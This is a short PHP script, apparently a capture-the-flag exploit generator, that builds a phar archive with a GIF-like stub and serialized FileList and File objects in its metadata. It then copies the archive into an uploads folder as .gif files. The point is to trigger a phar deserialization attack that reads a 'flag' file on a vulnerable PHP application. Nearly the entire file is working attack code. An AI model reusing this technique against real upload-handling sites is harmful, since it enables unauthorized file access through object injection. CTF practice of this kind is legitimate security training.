<?php

if (@$_SERVER['argv'][1] != 1) {
	system('php -d phar.readonly=0 gen_phar.php 1');
	exit;
}

class FileList {
	private $files;
	private $results;
	private $funcs;

	public function __construct($filename) {
		$this->files = array();
		$this->results = array();
		$this->funcs = ['open', 'close', 'detele'];
		array_push($this->files, new File($filename));
	}

}
class File {
	public $filename;
	public function __construct($filename) {
		$this->filename = $filename;
	}
}

class Test {
	public $filename;
	public function __construct() {
		var_dump(666666);
	}
}

// $x = new FileList();
// $x->filename = "/Users/virink/Playground/flag";
$a = [new FileList('/Users/virink/Playground/tests/'), new File('/Users/virink/Playground/tests/flag')];
$p = new Phar('./exp.phar', 0);
$p->startBuffering();
$p->setStub('V<?php __HALT_COMPILER(); ? >');
$p->setMetadata($a);
$p->addFromString('v.txt', '666');
$p->stopBuffering();

echo file_get_contents("./exp.phar");

for ($i = 0; $i < 5; $i++) {
	copy('./exp.phar', "./uploads/74b1b39eba83c57d54a79f6089547a5826b808b6/exp_${i}.gif");
}

?>